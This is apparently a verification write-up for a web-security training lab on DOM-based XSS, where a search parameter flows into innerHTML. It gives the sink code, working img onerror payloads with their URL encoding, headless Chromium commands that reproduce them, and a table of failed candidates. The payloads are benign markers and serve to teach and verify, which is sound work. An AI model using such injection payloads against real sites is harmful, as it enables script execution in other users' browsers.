# Verification — DOM XSS in innerHTML(source: location.search)

## Methodology
1. Static review (curl): read the inline script on the results page; identify source,
   sink, and the exact assignment context (whole-element content vs interpolation).
2. SSR check: confirm whether the term is reflected server-side at all.
3. Positive proof in a real parser (headless Chromium) with a **non-blocking** marker
   (`document.title`) — avoids `alert()` freezing the dump.
4. Negative proof: same harness with `<script>` payload — must NOT execute (proves the
   sink-semantics rule is real, not assumed).
5. Lab acceptance: real-browser `alert(1)` via the event-handler vector; banner check.

## Evidence

### 1. Sink code identified (curl, GET /?search=reconprobe)
```
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) { doSearchQuery(query); }
```
Assignment context: entire content of `<span id="searchMessage">` — no breakout needed.

### 2. SSR check: zero server reflection
The `<h1>` contains only static spans; the query term appears nowhere in the HTTP
response. This is a **pure** DOM sink — response inspection alone can never reveal it.

### 3. Positive execution proof (headless Chromium dump-dom)
```
/?search=%3Cimg%20src%3Dx%20onerror%3Ddocument.title%3D%27IHFIRED%27%3E
→ exit 0; <title>IHFIRED</title>
→ DOM: <span id="searchMessage"><img src="x" onerror="document.title='IHFIRED'"></span>
```
Reading: fragment parsed, `img` inserted, bogus `src` errored, handler fired.

### 4. Negative proof — `<script>` is inert through innerHTML (headless, same harness)
```
/?search=%3Cscript%3Edocument.title%3D%27SCRIPTWOULD%27%3C/script%3E
→ <title> UNCHANGED ("DOM XSS in innerHTML sink using source location.search")
→ DOM still serializes the element: <span id="searchMessage"><script>…</script></span>
```
Reading: presence-in-DOM ≠ execution. The script node exists but never runs — the HTML
spec neuter. (Caution for future verifiers: `grep` for the marker string hits the inert
node text; assert on an execution side-effect such as `<title>`, not on string presence.)

### 5. Lab acceptance
Real browser tab → `/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E` → alert fired →
banner `is-solved` (4/4 consecutive polls).

### 6. Failed-candidate analysis
| Attempt | Result | Why |
|---|---|---|
| `<script>alert(1)</script>` | inert element, no execution | innerHTML-inserted scripts never run (spec) |
| `"> <script>…` breakout prefix | unnecessary / harmless but pointless | value is whole-element content, nothing to close; extra `">` becomes stray text |
| SSR reflection XSS | n/a | term never appears in the response |
| curl-only "verification" | impossible | no JS execution; DOM sinks require a parser |

## Reproducibility
```
BASE=…
# positive (headless proof)
chromium --headless --no-sandbox --dump-dom \
  "$BASE/?search=%3Cimg%20src%3Dx%20onerror%3Ddocument.title%3D%27IHFIRED%27%3E" | grep -o "<title>[^<]*</title>"
# negative (script inert)
chromium --headless --no-sandbox --dump-dom \
  "$BASE/?search=%3Cscript%3Edocument.title%3D%27SCRIPTWOULD%27%3C/script%3E" | grep -o "<title>[^<]*</title>"
```

## Confirmation criteria
- CONFIRMED: event-handler execution (title mutation), inert-`<script>` behavior (title
  unchanged), real-browser `alert(1)` accepted by lab.
- Assertion discipline: always assert on an execution side-effect, never on marker-string
  presence in serialized DOM.